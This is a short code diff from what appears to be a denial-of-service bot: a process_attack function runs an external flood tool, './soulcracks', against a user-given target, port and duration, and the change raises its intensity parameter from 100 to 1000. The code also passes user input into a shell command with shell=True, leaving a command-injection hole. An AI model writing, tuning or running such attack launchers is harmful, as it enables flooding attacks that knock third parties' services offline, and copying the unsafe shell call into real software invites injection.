@@ -84,7 +84,7 @@ def process_attack(message, target, port, time):
     start_attack_reply(message, target, port, time)
     
     # Execute the attack
-    full_command = f"./soulcracks {target} {port} {time} 100"
+    full_command = f"./soulcracks {target} {port} {time} 1000"
     try:
         subprocess.run(full_command, shell=True, check=True)
     except subprocess.CalledProcessError:
